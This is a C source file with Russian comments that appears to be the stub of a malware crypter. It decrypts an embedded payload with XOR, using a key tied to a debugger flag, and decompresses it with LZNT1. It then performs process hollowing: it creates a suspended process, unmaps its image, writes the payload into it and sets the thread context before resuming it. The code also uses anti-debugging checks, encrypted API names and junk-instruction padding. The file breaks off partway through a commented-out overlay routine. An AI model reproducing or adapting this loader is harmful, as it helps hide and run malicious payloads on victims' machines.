//PE - загрузчик из памяти
#define ALIGN_DOWN(x, align) (x & ~(align-1))
#define ALIGN_UP(x, align) ((x & (align-1)) ?ALIGN_DOWN(x, align) + align:x)
#define MIN(a,b)  ((a)<(b)?(a):(b))
typedef struct _DECOMP
{
	PUCHAR lpCBuffer;
	PUCHAR lpUBuffer;
	ULONG c_size;
	ULONG uc_size;
}DECOMP,*PDECOMP;
DWORD dwE = 0;
//***************вывод отладочной информации об ошибке***
LONG DebugInformatorX(PEXCEPTION_POINTERS p_excep)
{ 
 //Здесь мы можем работать с фреймами о которых говорил Clerk
  PEXCEPTION_RECORD p_excep_record = p_excep->ExceptionRecord;
  char sz_msg[512];
  sprintf(sz_msg,"Error in Address:0x%08X\n",p_excep_record->ExceptionAddress);
  //.....Здесь еще много чего из фреймов полезного извлечь можно,
  // а потом вывести ч/з чего - нибудь,    например MessageBox (кстати он может не 
  //работать при некоторых ошибках) или DebugPrint или лог в файл
  LPVOID lpMsgBuf;
  FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER |    
                        FORMAT_MESSAGE_FROM_SYSTEM,
                        NULL,RtlNtStatusToDosError(p_excep_record->ExceptionCode),
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                        (LPSTR) &lpMsgBuf,0,NULL);
  strcpy(sz_msg,(LPCSTR)lpMsgBuf);
  LocalFree(lpMsgBuf);
  MessageBoxA(GetActiveWindow(),sz_msg,"ERROR",MB_ICONSTOP | MB_SYSTEMMODAL);
  //здесь можно принять решение что делать дальше:
  return EXCEPTION_CONTINUE_EXECUTION;
  //или return EXCEPTION_EXECUTE_HANDLER;
  //или return EXCEPTION_CONTINUE_SEARCH;
}
LONG DebugInformatorXX(void)
{ 
	LPVOID lpMsgBuf;
	char sz_msg[512]={0};
	FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER |    
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR) &lpMsgBuf,0,NULL);
	strcpy(sz_msg,(LPCSTR)lpMsgBuf);
	LocalFree(lpMsgBuf);
	MessageBoxA(GetActiveWindow(),sz_msg,"ERROR",MB_ICONSTOP | MB_SYSTEMMODAL);
	//здесь можно принять решение что делать дальше:
	return EXCEPTION_CONTINUE_EXECUTION;
	//или return EXCEPTION_EXECUTE_HANDLER;
	//или return EXCEPTION_CONTINUE_SEARCH;
}
LONG DebugInformatorXXX(DWORD dwerr,char* szBoxTitle)
{ 
	LPVOID lpMsgBuf;
	char sz_msg[512]={0};
	FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER |    
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,dwerr,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR) &lpMsgBuf,0,NULL);
	strcpy(sz_msg,(LPCSTR)lpMsgBuf);
	LocalFree(lpMsgBuf);
	MessageBoxA(GetActiveWindow(),sz_msg,szBoxTitle,MB_ICONSTOP | MB_SYSTEMMODAL);
	//здесь можно принять решение что делать дальше:
	return EXCEPTION_CONTINUE_EXECUTION;
	//или return EXCEPTION_EXECUTE_HANDLER;
	//или return EXCEPTION_CONTINUE_SEARCH;
}
//#ifdef ANTIDEBUG
//	BOOL IsDebugged(PPEB pPEBBB)
//	{
//		BYTE beingdebugged=0;
//		__asm
//		{
//			pushad
//			mov eax, [pPEBBB]//fs:[30h]
//			mov esi, eax
//				mov al, byte ptr [eax + 2]
//			test al, al
//				jne Debugged
//
//				mov eax, [esi + 68h]
//			and eax, 70h
//				test eax, eax
//				jne Debugged
//
//				mov eax, [esi + 18h]
//			mov eax, [eax + 10h]
//			test eax, eax
//				jne Debugged
//
//				jmp AllGood
//Debugged:
//			mov [beingdebugged], 1
//AllGood:
//			popad
//		}
//		return beingdebugged;
//	}
//#endif

//*******************************************************************************************
//bool __fastcall GetProcAdrLibFunc(HMODULE hMod,PVOID* pFunc ,char* FunName,WORD Ordinal)
//{
//	UNICODE_STRING wmP={0};
//	/*if(!dwNtBase)
//	{
//		RtlInitUnicodeString(&wmP,L"ntdll.dll");
//		if((!NT_SUCCESS(LdrGetDllHandle(0,0,&wmP,&dwNtBase)))|| dwNtBase==NULL) if(!NT_SUCCESS(LdrLoadDll(NULL,0,&wmP,&dwNtBase))) {*pFunc=NULL;return false;}
//		RtlFreeUnicodeString(&wmP);
//	}*/
//	if(Ordinal==0)
//	{
//		ANSI_STRING wmPP;
//		RtlInitAnsiString(&wmPP,FunName);
//		if((!NT_SUCCESS(LdrGetProcedureAddress(hMod,&wmPP,Ordinal,(PVOID*)pFunc)))|| *pFunc==NULL){*pFunc=NULL;return false;}
//		//RtlFreeAnsiString(&wmPP);
//	}
//	//else
//	//{
//	//	if((!NT_SUCCESS(LdrGetProcedureAddress(dwNtBase,NULL,Ordinal,(PVOID*)pFunc)))|| *pFunc==NULL){*pFunc=NULL;return false;}
//	//}//
//	return true;
//}
//*******************************************************************************************
//Получение адресов ф-ций различных библиотек
LPVOID WINAPI GetProcAddressNt(BYTE bNt,char* FunName)
{
	LPVOID pFunc = NULL;
	HMODULE hBase;
	switch (bNt)
	{
		case 0:
			hBase = dwNtBase;
		break;
		case 1:
			hBase = dwKrnlBase;
		break;
		case 2:
			DPRINT3("GetProcAddressNt#%d: %s: %s",bNt,szUser32,FunName);
			hBase =GetModuleHandleA(szUser32);
		break;
		case 3:
			DPRINT3("GetProcAddressNt#%d: %s: %s",bNt,szCrypt32,FunName);
			hBase =LoadLibraryA(szCrypt32);
		break;
		case 4:
			DPRINT3("GetProcAddressNt#%d: %s: %s",bNt,szAdvapi32,FunName);
			hBase =LoadLibraryA(szAdvapi32);
		break;
	}
	__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	//if(!GetProcAdrLibFunc(hBase,&pFunc ,FunName,0)) DPRINT1("GetProcAddressNt %s ERROR",FunName);
	if(hBase) pFunc = GetProcAddress(hBase,FunName);
	if(pFunc==NULL) ExitProcess(0x00F4FCFA);
	return pFunc;
}
//---------------------------------------------------------------------------------------------------------------------
//Разжималка LZNT1
#pragma code_seg(push, ".text$5")
DWORD __fastcall DeCompressor(IN PDECOMP lpDeco)
{
	DWORD res_size = 0, status = STATUS_UNSUCCESSFUL;
	DPRINT1("pRtlDecompressBuffer=0x%X",pRtlDecompressBuffer);
	//if(*((BYTE*)pRtlDecompressBuffer)==0xCC || *((BYTE*)pRtlDecompressBuffer)==0xE9) pRtlDecompressBuffer = NULL;
	status = pRtlDecompressBuffer(0x0002/*+pPEB->BeingDebugged*/,lpDeco->lpUBuffer,lpDeco->uc_size,lpDeco->lpCBuffer,lpDeco->c_size,&res_size);
	if(!NT_SUCCESS(status)) {DPRINT1("DeCompressor: ERROR =0x%X",status);return 0;}
	return res_size;
}
#pragma code_seg(pop)
//*******************************************************************************************
//ДЕ-Шифратор помеченных функций в стабе
//На выходе - число пошифр. ф-ций
//BYTE FunDeCript(IN PBYTE lpBuffer,IN DWORD dwSz,IN BYTE numFunction,IN BYTE numSuperFunction)
//{
//	BYTE Fcnt=0; //Счётчик ф-ций
//	//Находим метку начала нужной ф-ции {0xAF;0xBF;0xCF;0xDF}=DWORD {DF,CF,BF,AF}
//	for(DWORD i=0;i<dwSz;i++)
//	{
//		if(lpBuffer[i]==(0xA0 + numFunction) && lpBuffer[i+1]==0xB0 && lpBuffer[i+2]==0xC0 && lpBuffer[i+3]==0xD0+numSuperFunction)
//		{
//			LPVOID sadr=lpBuffer+i; DWORD oldp,old_oldp;
//			VirtualAlloc(sadr,0x1000,MEM_COMMIT | MEM_RESET, PAGE_EXECUTE_READWRITE);
//			i+=4;
//			BYTE k=0x35+numFunction;
//			for(DWORD j=0;j<dwSz-i-4;j++)
//			{
//				if(*((DWORD*)(lpBuffer+i+j))==0xAFBFCFDF)
//				{
//					//VirtualProtectEx(INVALID_HANDLE_VALUE,sadr,0x1000,oldp,&oldp);
//					//VirtualProtect(sadr,0x1000,oldp,&old_oldp);
//					//__VirtualAllocEx(INVALID_HANDLE_VALUE,sadr,0x1000,MEM_COMMIT | MEM_RESET,PAGE_EXECUTE_READ);
//					Fcnt++;
//					break;
//				}
//				BYTE tmp=lpBuffer[i+j];
//				lpBuffer[i+j]=tmp^k;
//			}
//		}
//	}
//	return Fcnt;
//}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//Определение флагов защиты секций
#pragma code_seg(push, ".text$6")
DWORD _fastcall GetSectionProtection(DWORD sc)
{
	DWORD dwResult=0;
	if (sc & IMAGE_SCN_MEM_NOT_CACHED) dwResult |= PAGE_NOCACHE;
	if (sc & IMAGE_SCN_MEM_EXECUTE)
	{
		if (sc & IMAGE_SCN_MEM_READ)
		{
			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_EXECUTE_READWRITE;	else	dwResult |= PAGE_EXECUTE_READ;
		}
		else 
		{
			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_EXECUTE_WRITECOPY;	else	dwResult |= PAGE_EXECUTE;
		}
	}
	else
	{
		if (sc & IMAGE_SCN_MEM_READ)
		{
			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult|=PAGE_READWRITE;	else dwResult|=PAGE_READONLY;
		}
		else 
		{
			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult|=PAGE_WRITECOPY;	else dwResult|=PAGE_NOACCESS;
		}
	}
	return dwResult;
}
#pragma code_seg(pop)
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//LONG __stdcall DebugInformator(PEXCEPTION_POINTERS p_excep)
//{ 
//	PEXCEPTION_RECORD p_excep_record = p_excep->ExceptionRecord;
//	bExcept = LOBYTE(p_excep_record->ExceptionCode);
//	return EXCEPTION_EXECUTE_HANDLER;
//}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//SEH - фильтр
LONG WINAPI ExFilter(	__in struct _EXCEPTION_POINTERS *ExceptionInfo)
{
	bExcept = LOBYTE(ExceptionInfo->ExceptionRecord->ExceptionCode+pPEB->OSMajorVersion);
	PREDPRINT("ExFilter");
	dwE++;
	__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	return EXCEPTION_CONTINUE_EXECUTION;
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//Оживление процесса со сбросом кеша предсказаний
#pragma code_seg(push, ".text$3")
void Resumer(LPVOID lpAddress,PIMAGE_NT_HEADERS pinh,PPROCESS_INFORMATION ppi, PCONTEXT pctx)
{
	PREDPRINT("Resumer->");
	DPRINT("Resumer: Start");
	_NtResumeProcess pNtResumeProcess;
	for(int i=0;i<(szFakeDWORD[0]*szFakeDWORD[3]*szFakeDWORD[1]);i++)
	{
		pctx->Eax = (DWORD)lpAddress + pinh->OptionalHeader.AddressOfEntryPoint;
		
	}
	pNtResumeProcess = (_NtResumeProcess)GetProcAddressNt(0,Decrypt(szcNtResumeProcess));
	DPRINT("Try Context set");
	if(NT_SUCCESS(pNtSetContextThread(ppi->hThread, pctx)))
	{
		DPRINT("Context setted");
		#ifdef ANTIDEBUG
			if(*((BYTE*)pFlushInstructionCache)==0xCC || *((BYTE*)pFlushInstructionCache)==0xE9) __asm cld; //Antidebug
		#endif
		if(pFlushInstructionCache(ppi->hProcess,lpAddress,pinh->OptionalHeader.SizeOfImage))
		{	
			BOOL bDBG = FALSE;
			DPRINT("InstructionCache Flushed");
//			DPRINT("FlushInstructionCache - OK");
			//Sleep(szFakeDWORD[2]+szFakeDWORD[3]+szFakeDWORD[1]);
			//if(CheckRemoteDebuggerPresent(ppi->hProcess,&bDBG))
			{
				//pNtResumeProcess(ppi->hProcess);
				DPRINT("CheckRemoteDebuggerPresent - OK");
				if(!bDBG) //
				{
					/*ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
					NtSetInformationProcess(ppi->hProcess,ProcessExecuteFlags,&ExecuteFlags,4);*/
//					DPRINT("RemoteDebugger is Not Present");
					//ResumeThread(((PPROCESS_INFORMATION)((DWORD)ppi+pPEB->BeingDebugged))->hThread);
					pNtResumeProcess(ppi->hProcess);
					/*HANDLE hProcess = ppi->hProcess;
					HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)pNtResumeProcess,&(hProcess),0,NULL);*/
					//if(NT_SUCCESS(pNtResumeProcess(ppi->hProcess))) 
					{
						DPRINT("Resumed");
						//pNtClose(ppi->hThread);
						//
						/*for(DWORD k=0;k<= (DWORD)pPEB->BeingDebugged+ dwSize2-sizeof(SCOMP);k++)
						{
							lpShell[k] = 0;
						}*/
						 //SelfDel();
						 //CleanupA();
						//SelfDelete();
						//TerminateProcess(INVALID_HANDLE_VALUE,0x00F4FCFA);
						/*if(WAIT_OBJECT_0 == WaitForSingleObject(hThread,INFINITE))
						{
							DWORD dwExitCode;
							if(GetExitCodeProcess(ppi->hProcess,&dwExitCode))
							{
								DPRINT("Resumed");
								DWORD dwTExitCode;
								GetExitCodeThread(hThread,&dwTExitCode);
								DebugInformatorXXX(dwTExitCode);
								DPRINT1("ExitCode = 0x%X",dwExitCode);
							}
						}*/
					}
				}
			}
		}
	}
}
#pragma code_seg(pop)
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//Расшифровка
#pragma code_seg(push, ".text$1")
_NtWriteVirtualMemory __fastcall AntidebugAndDecrypt()
{
	_NtWriteVirtualMemory lpRet;
	//DPRINT2("AntidebugAndDecrypt: Start. dwSize2 = %d, dwSizeFull64= %d",dwSize2,dwSizeFull64);
	//DPRINT2("AntidebugAndDecrypt: Start. Size = %d, key=0x%X",dwSize2-sizeof(SCOMP),scomp->bXOR + pPEB->BeingDebugged);
	//DPRINT1("AntidebugAndDecrypt: InFirstByte = 0x%X",lpShell[0]);
	DWORD k = 0x00F4FCFA;
	
	//__try
	{
		/*__asm
		{
			nop
			pushad
			xor eax,eax
			mov eax,dwE
			nop
			div eax
			popad
		}*/
		//bExcept = /*bExcept*/0X94 + pPEB->BeingDebugged;
		//DPRINT("AntidebugAndDecrypt: try");
		//DWORD dwE = pPEB->BeingDebugged;
		////throw(pPEB->BeingDebugged);

		//DPRINT("AntidebugAndDecrypt: eRROR: try-->No except");
	}
	//__except(DebugInformator((PEXCEPTION_POINTERS)_exception_info()))
	{
//		//lstrcatA(szZwWriteVirtualMemory,"rtualMemory");
		lpRet = (_NtWriteVirtualMemory) GetProcAddressNt(0,Decrypt(szcZwWriteVirtualMemory));
		//lstrcatA(szZwSetContextThread,"tThread");
		for(k=0;k<= (DWORD)pPEB->BeingDebugged+ dwSize2-sizeof(SCOMP);k++)
		{
			//NtYieldExecution();
			__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			//SwitchToThread();
			//NtYieldExecution();
//			__asm
//			{
//				nop
//				nop
//				nop
//				nop
//				PREFETCHNTA QWORD PTR DS:[EAX]
//				push eax
//				push ss
//				xor eax,eax
//				test eax,eax
//				pop ss
//LabelFuck: 
//				jnz LabelFuck
//				pop eax
//			}
			lpShell[k] = lpShell[k] ^ (scomp->bXOR + pPEB->BeingDebugged);
		}
		pNtSetContextThread =(_NtSetContextThread)GetProcAddressNt(0,Decrypt(szcZwSetContextThread));
		DPRINT1("AntidebugAndDecrypt: End, OutFirstByte = 0x%X",lpShell[0]);
		return lpRet;
	}
	return lpRet;
}
#pragma code_seg(pop)
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//Выделение памяти
#pragma code_seg(push, ".text$2")
NTSTATUS __fastcall Allocator(PALLOC lpAlloc)
{
	//PREDPRINT("Allocator->");
	NTSTATUS ntsStatus = STATUS_UNSUCCESSFUL;
	//__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
	return ntsStatus = pNtAllocateVirtualMemory(lpAlloc->hProcess,&(lpAlloc->lpAddress),pPEB->BeingDebugged,&(lpAlloc->dwSize), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}
#pragma code_seg(pop)
_NtWriteVirtualMemory pNtWriteVirtualMemory;
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//Тело лоадера
#pragma code_seg(push, ".text$5")
DWORD __fastcall LoaderPE(DWORD dwParam)
{
	if(lpLockRoutine) {pPEB->FastPebLockRoutine = lpLockRoutine; }
	DestroyWindow(hWnd);
	PREDPRINT("LoaderPE->");
	DPRINT("LoaderPE: Start");
	NTSTATUS ntStatus;
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	DWORD i;
	DWORD dwaddr;
	DWORD dwTemp;
	DWORD dwBaseAddr;
	LPVOID lpPEB_ImageBaseAddress;
	DECOMP deco;
	PIMAGE_SECTION_HEADER pish;
	LPBYTE lpBuffer = lpOutBuff;
	PIMAGE_DOS_HEADER pidh;
	PIMAGE_NT_HEADERS pinh;
	PIMAGE_OPTIONAL_HEADER32 ioh;
	
	PPEB pPEBx;
	DWORD dwAdrOfPeb;
	DWORD dwSecAdr;
	DWORD dwSecSz;
	DWORD dwSecProt;
	DWORD dwCodeSize;
	_CreateProcessW pCreateProcessW;
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
//__START1
	if(pPEB!=NULL)
	si.cb = sizeof(STARTUPINFOW);
	si.wShowWindow = 0;
	si.cbReserved2 = 0;
	si.dwFillAttribute = 0;
	si.dwFlags = 0;
	si.dwX=0;
	si.dwXCountChars =0;
	si.dwXSize=0;
	si.dwY = 0;
	si.dwYCountChars = 0;
	si.dwY = 0;
	si.dwYSize =0 ;
	si.hStdError = NULL;
	si.hStdInput = NULL;
	si.hStdOutput = NULL;
	DWORD dwAllocCnt =0 ;
	si.lpDesktop = NULL;
	si.lpReserved = NULL;
	si.lpReserved2 = 0;
	si.lpTitle = NULL;
	si.wShowWindow = 0;
	ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
	pCreateProcessW = (_CreateProcessW)GetProcAddressNt(1,Decrypt(szcCreateProcessW));
	//UnregisterClassA(szSysEnter,(HINSTANCE)dwExeBase);
	//GetNetworkProcessList();
	DPRINT1("LoaderPE: pCreateProcessW = 0x%X",pCreateProcessW);//wcCmdLine
	/*HANDLE hjob = CreateJobObject(NULL, NULL);
	JOBOBJECT_BASIC_LIMIT_INFORMATION jobli = { 0 };
	JOBOBJECT_SECURITY_LIMIT_INFORMATION jobsec = {0};
	jobli.LimitFlags = JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
	SetInformationJobObject(hjob, JobObjectBasicLimitInformation, &jobli, sizeof(jobli));
	jobsec.SecurityLimitFlags=JOB_OBJECT_SECURITY_NO_ADMIN;
	SetInformationJobObject(hjob, JobObjectSecurityLimitInformation, &jobsec, sizeof(jobsec));*/

	if(pCreateProcessW(NULL,wcCmdLine,NULL,NULL, FALSE, CREATE_SUSPENDED /*| DEBUG_ONLY_THIS_PROCESS *//*|  | CREATE_NO_WINDOW*/, NULL, NULL, &si, &pi)) {ntStatus = pNtGetContextThread(pi.hThread, &ctx); DPRINT("LoaderPE: CreateProcessW - OK");} else {DPRINT1("LoaderPE: CreateProcess error:0x%X",GetLastError());ExitProcess(0x00F4FCFA);}
	// AssignProcessToJobObject(hjob, pi.hProcess);
	stAlloc.lpAddress = (LPVOID)scomp->dwImageBase;

	pPEBx = (PPEB) ctx.Ebx;
//NEW_NOD
	dwSecAdr = (DWORD) scomp->dwImageBase;
	//NtMakeTemporaryObject((PVOID)dwSecAdr);
	ntStatus = pNtUnmapViewOfSection(pi.hProcess,(PVOID)dwSecAdr);

	stAlloc.hProcess = pi.hProcess;
		
_L_Rep_Alloc:
	stAlloc.dwSize = scomp->dwSizeOfImage + dwFakeDWORD*pPEB->BeingDebugged;
	ntStatus = Allocator(&stAlloc);
	if(!NT_SUCCESS(ntStatus))
	{
		DPRINT3("LoaderPE: NtAllocateVirtualMemory #%d in 0x%X Error, Status = 0x%X",dwAllocCnt,stAlloc.lpAddress,ntStatus);
		if(dwAllocCnt<(BYTE)szFakeDWORD[0]) {dwAllocCnt++; goto _L_Rep_Alloc;}
		ntStatus = Allocator(&stAlloc);
		if(!(NT_SUCCESS(ntStatus)))
		{
			DPRINT2("LoaderPE: NtAllocateVirtualMemory in 0x%X Error, Status = 0x%X",stAlloc.lpAddress,ntStatus);
			stAlloc.lpAddress = NULL;
			ntStatus = Allocator(&stAlloc);
		}
	} else DPRINT("LoaderPE: NtAllocateVirtualMemory - OK");
	SetUnhandledExceptionFilter(ExFilter);
	if(!NT_SUCCESS(ntStatus)) return 0;
	DPRINT1("LoaderPE: NtAllocateVirtualMemory - X in 0x%X OK",stAlloc.lpAddress); //STATUS_CONFLICTING_ADDRESSES
	dwBaseAddr = (DWORD)stAlloc.lpAddress;
	dwAdrOfPeb = (DWORD) pPEBx;
	lpPEB_ImageBaseAddress = (LPVOID)(dwAdrOfPeb + 8);
	//	
	////Расшифровка
	pNtWriteVirtualMemory = AntidebugAndDecrypt();

	DPRINT1("LoaderPE: AntidebugAndDecrypt=0x%X",pNtWriteVirtualMemory);

	if(!NT_SUCCESS(pNtWriteVirtualMemory(pi.hProcess,lpPEB_ImageBaseAddress,&dwBaseAddr,4,&dwTemp))) return 0;

	deco.c_size = dwRegSz;
	deco.lpCBuffer = lpShell;
	deco.lpUBuffer = lpOutBuff;
	deco.uc_size = dwUnco;

	DPRINT2("Try DeCompressor: cSz=%d,uSz=%d",scomp->dwSzCompBlock,dwUnco);
	DPRINT1("Try DeCompressor: FirstByte=0x%X",lpShell[0]);
	dwCodeSize = DeCompressor(&deco);
	////Распаковка
	if(dwCodeSize>0) DPRINT1("LoaderPE: DeCompressed: %d byte",dwCodeSize); else {DPRINT("LoaderPE: DeCompress ERROR"); TerminateProcess(pi.hProcess,0x00F4FCFA);goto _L_Exit;}
	pidh = (PIMAGE_DOS_HEADER)&lpBuffer[0];
	pinh = (PIMAGE_NT_HEADERS)&lpBuffer[pidh->e_lfanew];
	ioh = &pinh->OptionalHeader;
	DPRINT1("LoaderPE: Total Section:%d",pinh->FileHeader.NumberOfSections);
	if(!NT_SUCCESS(pNtWriteVirtualMemory(pi.hProcess, stAlloc.lpAddress, &lpBuffer[0], pinh->OptionalHeader.SizeOfHeaders,&dwTemp))) return 0x00F4FCFA;;
	pNtProtectVirtualMemory =(_NtProtectVirtualMemory)GetProcAddressNt(0,Decrypt(szcZwProtectVirtualMemory));
	DPRINT2("LoaderPE: NtWriteVirtualMemory to HEADERS: 0x%X, Len: 0x%X OK",stAlloc.lpAddress,pinh->OptionalHeader.SizeOfHeaders);
	for(i = 0; i < pinh->FileHeader.NumberOfSections; i++)
	{	
		pish = (PIMAGE_SECTION_HEADER)&lpBuffer[pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i];
		dwSecAdr = (DWORD)stAlloc.lpAddress + pish->VirtualAddress;
		dwSecSz = pish->Misc.VirtualSize;
		if(NT_SUCCESS(pNtWriteVirtualMemory(pi.hProcess, (LPVOID)(dwSecAdr), &lpBuffer[pish->PointerToRawData], pish->SizeOfRawData,&dwTemp)))
		{
			dwSecProt = GetSectionProtection(pish->Characteristics);
			if(NT_SUCCESS(pNtProtectVirtualMemory(pi.hProcess,(LPVOID*)&dwSecAdr,&dwSecSz,dwSecProt,&dwaddr)))
			{
				DPRINT3("LoaderPE:#%d:Write & Protect 0x%X at addr:0x%X",i,dwSecSz,dwSecAdr);
			} else break;
		}
	}
//__END1
		//Write Overlay
//		DWORD dwOvrStartNoAlign = pish->PointerToRawData + pish->SizeOfRawData;
//		DWORD dwOvrStart = ALIGN_UP(dwOvrStartNoAlign,ioh->SectionAlignment);
//		DWORD dwOvrLen =0;
//		BOOL bOvr = FALSE;
//		LPBYTE lpbOvr = NULL;
//		if(dwOvrStart < dwCodeSize)
//		{
//			bOvr = TRUE;
//			goto _ovr;
//		}
//		if(dwOvrStartNoAlign < dwCodeSize)
//		{
//			bOvr = TRUE;
//			dwOvrStart = dwOvrStartNoAlign;
//		}
//_ovr:
//		if(bOvr)
//		{
//			dwOvrLen = dwCodeSize - dwOvrStart;
